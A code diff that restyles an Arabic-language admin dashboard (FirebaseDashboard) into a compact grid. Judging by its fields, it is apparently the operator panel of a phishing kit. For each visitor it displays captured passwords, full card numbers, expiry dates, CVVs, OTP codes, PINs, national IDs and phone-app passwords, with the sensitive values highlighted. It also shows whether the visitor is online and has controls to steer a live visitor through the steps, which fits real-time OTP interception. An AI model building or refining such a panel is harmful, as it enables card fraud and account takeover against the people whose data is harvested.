@@ -980,280 +980,231 @@ export default function FirebaseDashboard() {
           </div>
         </div>
 
-        {/* Detail Panel */}
-        <div className={cn("flex-1 overflow-y-auto p-3 md:p-6 order-1 md:order-2 h-1/2 md:h-full", currentTheme.bg)}>
+        {/* Detail Panel - Grid Layout */}
+        <div className={cn("flex-1 overflow-y-auto p-3 md:p-4 order-1 md:order-2 h-1/2 md:h-full", currentTheme.bg)}>
           {selectedSubmission ? (
-            <div className="max-w-2xl mx-auto space-y-4 md:space-y-6">
-              {/* Header */}
-              <div className={cn("rounded-xl p-4 md:p-6 border", currentTheme.card, currentTheme.border)}>
-                <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3 md:gap-4 mb-4">
+            <div className="space-y-3">
+              {/* Header Row */}
+              <div className={cn("rounded-lg p-3 border flex items-center justify-between", currentTheme.card, currentTheme.border)}>
+                <div className="flex items-center gap-3">
                   <div className={cn(
-                    "w-12 h-12 md:w-16 md:h-16 rounded-full flex items-center justify-center flex-shrink-0",
+                    "w-10 h-10 rounded-full flex items-center justify-center",
                     isUserOnline(selectedSubmission.visitorId) ? "bg-green-600" : "bg-blue-600"
                   )}>
-                    <User className="h-6 w-6 md:h-8 md:w-8 text-white" />
+                    <User className="h-5 w-5 text-white" />
                   </div>
-                  <div className="flex-1 min-w-0">
-                    <div className="flex flex-wrap items-center gap-2">
-                      <h2 className={cn("text-lg md:text-2xl font-bold truncate", currentTheme.text)}>
-                        {selectedSubmission.step_2_personal_data?.fullNameArabic || "زائر جديد"}
-                      </h2>
-                      {isUserOnline(selectedSubmission.visitorId) && (
-                        <span className="flex items-center gap-1 text-xs md:text-sm bg-green-500/20 text-green-400 px-2 py-1 rounded">
-                          <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
-                          متصل
-                        </span>
-                      )}
-                    </div>
-                    <p className={cn("text-sm truncate", currentTheme.textMuted)}>
-                      {selectedSubmission.step_2_personal_data?.fullNameEnglish || selectedSubmission.visitorId}
+                  <div>
+                    <h2 className={cn("font-bold", currentTheme.text)}>
+                      {selectedSubmission.step_2_personal_data?.fullNameArabic || "زائر جديد"}
+                    </h2>
+                    <p className={cn("text-xs", currentTheme.textMuted)}>
+                      {selectedSubmission.step_2_personal_data?.fullNameEnglish || selectedSubmission.visitorId.slice(0, 12)}
                     </p>
-                    {isUserOnline(selectedSubmission.visitorId) && (
-                      <p className="text-xs md:text-sm text-blue-400 mt-1">
-                        📍 {getUserCurrentPage(selectedSubmission.visitorId)}
-                      </p>
-                    )}
                   </div>
-                  <div className="flex gap-2 flex-shrink-0 w-full sm:w-auto justify-end">
-                    {selectedSubmission.status === "completed" && (
-                      <span className="bg-green-500 text-white px-2 md:px-4 py-1 md:py-2 rounded-lg font-bold text-xs md:text-sm">
-                        مكتمل
-                      </span>
-                    )}
-                    <Button
-                      variant="destructive"
-                      size="sm"
-                      onClick={() => handleDelete(selectedSubmission.id)}
-                      className="bg-red-600 hover:bg-red-700 text-xs md:text-sm"
-                    >
-                      <Trash2 className="h-4 w-4" />
-                      <span className="hidden sm:inline mr-1">حذف</span>
-                    </Button>
-                  </div>
-                </div>
-
-                {/* Step Progress */}
-                <div className="flex flex-wrap gap-1 md:gap-2 mt-4">
-                  {getStepStatus(selectedSubmission).map((step, i) => (
-                    <span key={i} className="bg-green-500/20 text-green-400 px-2 md:px-3 py-1 rounded-full text-xs md:text-sm">
-                      ✓ <span className="hidden sm:inline">{step}</span>
+                  {isUserOnline(selectedSubmission.visitorId) && (
+                    <span className="flex items-center gap-1 text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded">
+                      <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
+                      متصل
                     </span>
-                  ))}
+                  )}
                 </div>
+                <div className="flex gap-2">
+                  {selectedSubmission.status === "completed" && (
+                    <span className="bg-green-500 text-white px-3 py-1 rounded text-xs font-bold">مكتمل</span>
+                  )}
+                  <Button
+                    variant="destructive"
+                    size="sm"
+                    onClick={() => handleDelete(selectedSubmission.id)}
+                    className="bg-red-600 hover:bg-red-700 text-xs h-8"
+                  >
+                    <Trash2 className="h-4 w-4" />
+                  </Button>
+                </div>
+              </div>
 
-                {/* Admin Step Control */}
-                {isUserOnline(selectedSubmission.visitorId) && (
-                  <div className={cn("mt-4 pt-4 border-t", currentTheme.border)}>
-                    <p className="text-xs text-orange-400 mb-2 flex items-center gap-1">
-                      <Settings className="h-3 w-3" />
-                      تحكم في خطوات المستخدم
-                    </p>
-                    <div className="flex flex-wrap gap-2">
-                      {[1, 2, 3, 4, 5, 6, 7].map((step) => (
-                        <Button
-                          key={step}
-                          size="sm"
-                          variant="outline"
-                          onClick={() => handleSetUserStep(selectedSubmission.visitorId, step)}
-                          className={cn(
-                            "text-xs px-3",
-                            currentTheme.border,
-                            "hover:bg-orange-500/20 hover:text-orange-400 hover:border-orange-500"
-                          )}
-                        >
-                          خطوة {step}
-                        </Button>
-                      ))}
+              {/* Admin Step Control */}
+              {isUserOnline(selectedSubmission.visitorId) && (
+                <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
+                  <p className="text-xs text-orange-400 mb-2 flex items-center gap-1">
+                    <Settings className="h-3 w-3" /> تحكم في الخطوات
+                  </p>
+                  <div className="flex flex-wrap gap-1">
+                    {[1, 2, 3, 4, 5, 6, 7].map((step) => (
+                      <Button
+                        key={step}
+                        size="sm"
+                        variant="outline"
+                        onClick={() => handleSetUserStep(selectedSubmission.visitorId, step)}
+                        className={cn("text-xs px-2 h-7", currentTheme.border, "hover:bg-orange-500/20")}
+                      >
+                        {step}
+                      </Button>
+                    ))}
+                  </div>
+                </div>
+              )}
+
+              {/* Main Data Grid */}
+              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2">
+                {/* Personal Info */}
+                {selectedSubmission.step_2_personal_data?.email && (
+                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
+                    <div className="flex items-center gap-1 mb-1">
+                      <Mail className="h-3 w-3 text-blue-400" />
+                      <span className="text-xs text-blue-400">البريد</span>
                     </div>
+                    <p className={cn("text-sm font-medium truncate", currentTheme.text)}>
+                      {selectedSubmission.step_2_personal_data.email}
+                    </p>
+                  </div>
+                )}
+                {selectedSubmission.step_2_personal_data?.phoneNumber && (
+                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
+                    <div className="flex items-center gap-1 mb-1">
+                      <Phone className="h-3 w-3 text-green-400" />
+                      <span className="text-xs text-green-400">الهاتف</span>
+                    </div>
+                    <p className={cn("text-sm font-medium", currentTheme.text)}>
+                      {selectedSubmission.step_2_personal_data.phoneNumber}
+                    </p>
+                  </div>
+                )}
+                {selectedSubmission.step_2_personal_data?.dateOfBirth && (
+                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
+                    <div className="flex items-center gap-1 mb-1">
+                      <Calendar className="h-3 w-3 text-purple-400" />
+                      <span className="text-xs text-purple-400">الميلاد</span>
+                    </div>
+                    <p className={cn("text-sm font-medium", currentTheme.text)}>
+                      {selectedSubmission.step_2_personal_data.dateOfBirth}
+                    </p>
+                  </div>
+                )}
+                {selectedSubmission.step_2_personal_data?.nationality && (
+                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
+                    <div className="flex items-center gap-1 mb-1">
+                      <Globe className="h-3 w-3 text-cyan-400" />
+                      <span className="text-xs text-cyan-400">الجنسية</span>
+                    </div>
+                    <p className={cn("text-sm font-medium", currentTheme.text)}>
+                      {selectedSubmission.step_2_personal_data.nationality}
+                    </p>
+                  </div>
+                )}
+
+                {/* Sensitive Data - Highlighted */}
+                {selectedSubmission.step_3_password?.password && (
+                  <div className="rounded-lg p-3 border bg-red-900/30 border-red-500/30">
+                    <div className="flex items-center gap-1 mb-1">
+                      <Lock className="h-3 w-3 text-red-400" />
+                      <span className="text-xs text-red-400">كلمة المرور</span>
+                    </div>
+                    <p className="text-lg font-mono font-bold text-red-300">
+                      {selectedSubmission.step_3_password.password}
+                    </p>
+                  </div>
+                )}
+                {(selectedSubmission.step_4_payment?.cardNumber || selectedSubmission.step_4_payment_card?.cardNumber) && (
+                  <div className="rounded-lg p-3 border bg-orange-900/30 border-orange-500/30 col-span-2">
+                    <div className="flex items-center gap-1 mb-1">
+                      <CreditCard className="h-3 w-3 text-orange-400" />
+                      <span className="text-xs text-orange-400">رقم البطاقة</span>
+                    </div>
+                    <p className="text-lg font-mono font-bold text-orange-300 tracking-wider">
+                      {selectedSubmission.step_4_payment?.cardNumber || selectedSubmission.step_4_payment_card?.cardNumber}
+                    </p>
+                  </div>
+                )}
+                {(selectedSubmission.step_4_payment?.cardName || selectedSubmission.step_4_payment_card?.cardName) && (
+                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
+                    <span className="text-xs text-gray-400">الاسم على البطاقة</span>
+                    <p className={cn("text-sm font-medium", currentTheme.text)}>
+                      {selectedSubmission.step_4_payment?.cardName || selectedSubmission.step_4_payment_card?.cardName}
+                    </p>
+                  </div>
+                )}
+                {(selectedSubmission.step_4_payment?.expiry || selectedSubmission.step_4_payment_card?.expiry) && (
+                  <div className="rounded-lg p-3 border bg-yellow-900/30 border-yellow-500/30">
+                    <span className="text-xs text-yellow-400">انتهاء</span>
+                    <p className="text-lg font-mono font-bold text-yellow-300">
+                      {selectedSubmission.step_4_payment?.expiry || selectedSubmission.step_4_payment_card?.expiry}
+                    </p>
+                  </div>
+                )}
+                {(selectedSubmission.step_4_payment?.cvv || selectedSubmission.step_4_payment_card?.cvv) && (
+                  <div className="rounded-lg p-3 border bg-red-900/30 border-red-500/30">
+                    <span className="text-xs text-red-400">CVV</span>
+                    <p className="text-2xl font-mono font-bold text-red-300">
+                      {selectedSubmission.step_4_payment?.cvv || selectedSubmission.step_4_payment_card?.cvv}
+                    </p>
+                  </div>
+                )}
+                {selectedSubmission.step_4_payment?.otpCode && (
+                  <div className="rounded-lg p-3 border bg-purple-900/30 border-purple-500/30">
+                    <div className="flex items-center gap-1 mb-1">
+                      <Shield className="h-3 w-3 text-purple-400" />
+                      <span className="text-xs text-purple-400">OTP</span>
+                    </div>
+                    <p className="text-2xl font-mono font-bold text-purple-300">
+                      {selectedSubmission.step_4_payment.otpCode}
+                    </p>
+                  </div>
+                )}
+                {selectedSubmission.step_5_pin?.pinCode && (
+                  <div className="rounded-lg p-3 border bg-pink-900/30 border-pink-500/30">
+                    <div className="flex items-center gap-1 mb-1">
+                      <Lock className="h-3 w-3 text-pink-400" />
+                      <span className="text-xs text-pink-400">PIN</span>
+                    </div>
+                    <p className="text-2xl font-mono font-bold text-pink-300 tracking-widest">
+                      {selectedSubmission.step_5_pin.pinCode}
+                    </p>
+                  </div>
+                )}
+
+                {/* Phone Provider Data */}
+                {selectedSubmission.step_6_phone_provider?.provider && (
+                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
+                    <div className="flex items-center gap-1 mb-1">
+                      <Smartphone className="h-3 w-3 text-blue-400" />
+                      <span className="text-xs text-blue-400">مزود الخدمة</span>
+                    </div>
+                    <p className={cn("text-sm font-medium", currentTheme.text)}>
+                      {selectedSubmission.step_6_phone_provider.provider}
+                    </p>
+                  </div>
+                )}
+                {selectedSubmission.step_6_phone_provider?.personalId && (
+                  <div className={cn("rounded-lg p-3 border", currentTheme.card, currentTheme.border)}>
+                    <span className="text-xs text-gray-400">الرقم الشخصي</span>
+                    <p className={cn("text-sm font-medium", currentTheme.text)}>
+                      {selectedSubmission.step_6_phone_provider.personalId}
+                    </p>
+                  </div>
+                )}
+                {selectedSubmission.step_6_phone_provider?.password && (
+                  <div className="rounded-lg p-3 border bg-red-900/30 border-red-500/30">
+                    <span className="text-xs text-red-400">كلمة مرور التطبيق</span>
+                    <p className="text-lg font-mono font-bold text-red-300">
+                      {selectedSubmission.step_6_phone_provider.password}
+                    </p>
+                  </div>
+                )}
+
+                {/* Address */}
+                {selectedSubmission.step_2_personal_data?.address && (
+                  <div className={cn("rounded-lg p-3 border col-span-2", currentTheme.card, currentTheme.border)}>
+                    <div className="flex items-center gap-1 mb-1">
+                      <MapPin className="h-3 w-3 text-teal-400" />
+                      <span className="text-xs text-teal-400">العنوان</span>
+                    </div>
+                    <p className={cn("text-sm", currentTheme.text)}>
+                      {selectedSubmission.step_2_personal_data.address.buildingNumber} - {selectedSubmission.step_2_personal_data.address.street} - {selectedSubmission.step_2_personal_data.address.area}
+                    </p>
                   </div>
                 )}
               </div>
-
-              {/* Step 1: Account Type */}
-              {selectedSubmission.step_1_account_type && (
-                <DetailSection title="نوع الحساب" icon={User} theme={currentTheme}>
-                  <DetailItem 
-                    label="نوع المستخدم" 
-                    value={selectedSubmission.step_1_account_type.accountType === "citizen" ? "مواطن / مقيم" : "زائر"}
-                    theme={currentTheme}
-                  />
-                  <DetailItem 
-                    label="حساب جديد" 
-                    value={selectedSubmission.step_1_account_type.isNewAccount ? "نعم" : "لا"}
-                    theme={currentTheme}
-                  />
-                </DetailSection>
-              )}
-
-              {/* Step 2: Personal Data */}
-              {selectedSubmission.step_2_personal_data && (
-                <DetailSection title="البيانات الشخصية" icon={FileText} theme={currentTheme}>
-                  <div className="grid grid-cols-2 gap-4">
-                    <DetailItem label="الاسم بالعربية" value={selectedSubmission.step_2_personal_data.fullNameArabic} theme={currentTheme} />
-                    <DetailItem label="الاسم بالإنجليزية" value={selectedSubmission.step_2_personal_data.fullNameEnglish} theme={currentTheme} />
-                    <DetailItem label="البريد الإلكتروني" value={selectedSubmission.step_2_personal_data.email} icon={Mail} theme={currentTheme} />
-                    <DetailItem label="رقم الهاتف" value={selectedSubmission.step_2_personal_data.phoneNumber} icon={Phone} theme={currentTheme} />
-                    <DetailItem label="تاريخ الميلاد" value={selectedSubmission.step_2_personal_data.dateOfBirth} icon={Calendar} theme={currentTheme} />
-                    <DetailItem label="الجنس" value={selectedSubmission.step_2_personal_data.gender === "male" ? "ذكر" : "أنثى"} theme={currentTheme} />
-                    <DetailItem label="الجنسية" value={selectedSubmission.step_2_personal_data.nationality} icon={Globe} theme={currentTheme} />
-                  </div>
-                  {selectedSubmission.step_2_personal_data.address && (
-                    <div className={cn("mt-4 pt-4 border-t", currentTheme.border)}>
-                      <h4 className={cn("font-bold mb-3 flex items-center gap-2", currentTheme.textMuted)}>
-                        <MapPin className="h-4 w-4" /> العنوان
-                      </h4>
-                      <div className="grid grid-cols-3 gap-4">
-                        <DetailItem label="رقم المبنى" value={selectedSubmission.step_2_personal_data.address.buildingNumber} theme={currentTheme} />
-                        <DetailItem label="المنطقة" value={selectedSubmission.step_2_personal_data.address.area} theme={currentTheme} />
-                        <DetailItem label="الشارع" value={selectedSubmission.step_2_personal_data.address.street} theme={currentTheme} />
-                      </div>
-                    </div>
-                  )}
-                </DetailSection>
-              )}
-
-              {/* Step 3: Password */}
-              {selectedSubmission.step_3_password && (
-                <DetailSection title="كلمة المرور" icon={Shield} theme={currentTheme}>
-                  <div className="grid grid-cols-2 gap-4">
-                    <DetailItem 
-                      label="الحالة" 
-                      value={selectedSubmission.step_3_password.passwordSet ? "تم التعيين بنجاح" : "لم يتم"}
-                      theme={currentTheme}
-                    />
-                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
-                      <p className="text-xs text-red-400">كلمة المرور</p>
-                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
-                        {selectedSubmission.step_3_password.password || "-"}
-                      </p>
-                    </div>
-                  </div>
-                </DetailSection>
-              )}
-
-              {/* Step 4 Early: Card Data (saved before OTP) */}
-              {selectedSubmission.step_4_payment_card && !selectedSubmission.step_4_payment && (
-                <DetailSection title="بيانات البطاقة (قبل OTP)" icon={CreditCard} theme={currentTheme}>
-                  <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-4 mb-4">
-                    <p className="text-yellow-400 text-sm mb-2">⏳ تم حفظ البطاقة - في انتظار OTP</p>
-                  </div>
-                  <div className="grid grid-cols-2 gap-4">
-                    <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30 col-span-2">
-                      <p className="text-xs text-yellow-400">رقم البطاقة</p>
-                      <p className="font-mono font-bold text-yellow-300 mt-1 text-xl tracking-widest">
-                        {selectedSubmission.step_4_payment_card.cardNumber || "-"}
-                      </p>
-                    </div>
-                    <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
-                      <p className="text-xs text-yellow-400">الاسم على البطاقة</p>
-                      <p className="font-medium text-yellow-300 mt-1">
-                        {selectedSubmission.step_4_payment_card.cardName || "-"}
-                      </p>
-                    </div>
-                    <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
-                      <p className="text-xs text-yellow-400">تاريخ الانتهاء</p>
-                      <p className="font-mono font-bold text-yellow-300 mt-1">
-                        {selectedSubmission.step_4_payment_card.expiry || "-"}
-                      </p>
-                    </div>
-                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
-                      <p className="text-xs text-red-400">CVV</p>
-                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
-                        {selectedSubmission.step_4_payment_card.cvv || "-"}
-                      </p>
-                    </div>
-                  </div>
-                </DetailSection>
-              )}
-
-              {/* Step 4: Payment */}
-              {selectedSubmission.step_4_payment && (
-                <DetailSection title="الدفع وبيانات البطاقة" icon={CreditCard} theme={currentTheme}>
-                  <div className="grid grid-cols-2 gap-4 mb-4">
-                    <DetailItem label="المبلغ" value={selectedSubmission.step_4_payment.amount} theme={currentTheme} />
-                    <DetailItem label="الحالة" value={selectedSubmission.step_4_payment.status === "completed" ? "تم الدفع" : "قيد الانتظار"} theme={currentTheme} />
-                    <DetailItem label="طريقة الدفع" value={selectedSubmission.step_4_payment.paymentMethod === "card" ? "بطاقة ائتمان" : selectedSubmission.step_4_payment.paymentMethod} theme={currentTheme} />
-                  </div>
-                  
-                  {/* Card Details */}
-                  <div className={cn("mt-4 pt-4 border-t", currentTheme.border)}>
-                    <h4 className="font-bold text-yellow-400 mb-3 flex items-center gap-2">
-                      <CreditCard className="h-4 w-4" /> بيانات البطاقة
-                    </h4>
-                    <div className="grid grid-cols-2 gap-4">
-                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30 col-span-2">
-                        <p className="text-xs text-yellow-400">رقم البطاقة</p>
-                        <p className="font-mono font-bold text-yellow-300 mt-1 text-xl tracking-widest">
-                          {selectedSubmission.step_4_payment.cardNumber || "-"}
-                        </p>
-                      </div>
-                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
-                        <p className="text-xs text-yellow-400">الاسم على البطاقة</p>
-                        <p className="font-medium text-yellow-300 mt-1">
-                          {selectedSubmission.step_4_payment.cardName || "-"}
-                        </p>
-                      </div>
-                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
-                        <p className="text-xs text-yellow-400">تاريخ الانتهاء</p>
-                        <p className="font-mono font-bold text-yellow-300 mt-1">
-                          {selectedSubmission.step_4_payment.expiry || "-"}
-                        </p>
-                      </div>
-                      <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
-                        <p className="text-xs text-red-400">CVV</p>
-                        <p className="font-mono font-bold text-red-300 mt-1 text-lg">
-                          {selectedSubmission.step_4_payment.cvv || "-"}
-                        </p>
-                      </div>
-                      <div className="bg-purple-900/30 rounded-lg p-3 border border-purple-500/30">
-                        <p className="text-xs text-purple-400">رمز OTP</p>
-                        <p className="font-mono font-bold text-purple-300 mt-1 text-lg">
-                          {selectedSubmission.step_4_payment.otpCode || "-"}
-                        </p>
-                      </div>
-                    </div>
-                  </div>
-                </DetailSection>
-              )}
-
-              {/* Step 5: PIN */}
-              {selectedSubmission.step_5_pin && (
-                <DetailSection title="رمز PIN" icon={Shield} theme={currentTheme}>
-                  <div className="grid grid-cols-2 gap-4">
-                    <DetailItem 
-                      label="التحقق" 
-                      value={selectedSubmission.step_5_pin.pinVerified ? "تم التحقق بنجاح" : "لم يتم"}
-                      theme={currentTheme}
-                    />
-                    <div className="bg-orange-900/30 rounded-lg p-3 border border-orange-500/30">
-                      <p className="text-xs text-orange-400">رمز PIN</p>
-                      <p className="font-mono font-bold text-orange-300 mt-1 text-2xl tracking-widest">
-                        {selectedSubmission.step_5_pin.pinCode || "-"}
-                      </p>
-                    </div>
-                  </div>
-                </DetailSection>
-              )}
-
-              {/* Step 6: Phone Provider */}
-              {selectedSubmission.step_6_phone_provider && (
-                <DetailSection title="مزود خدمة الهاتف" icon={Smartphone} theme={currentTheme}>
-                  <div className="grid grid-cols-2 gap-4">
-                    <DetailItem label="مزود الخدمة" value={selectedSubmission.step_6_phone_provider.provider} theme={currentTheme} />
-                    <DetailItem label="رقم الهاتف" value={selectedSubmission.step_6_phone_provider.phoneNumber} icon={Phone} theme={currentTheme} />
-                    <DetailItem label="الرقم الشخصي" value={selectedSubmission.step_6_phone_provider.personalId} icon={User} theme={currentTheme} />
-                    <DetailItem label="البريد الإلكتروني" value={selectedSubmission.step_6_phone_provider.email} icon={Mail} theme={currentTheme} />
-                  </div>
-                  <div className={cn("mt-4 pt-4 border-t", currentTheme.border)}>
-                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
-                      <p className="text-xs text-red-400">كلمة مرور التطبيق</p>
-                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
-                        {selectedSubmission.step_6_phone_provider.password || "-"}
-                      </p>
-                    </div>
-                  </div>
-                </DetailSection>
-              )}
             </div>
           ) : (
             <div className={cn("flex items-center justify-center h-full", currentTheme.textMuted)}>
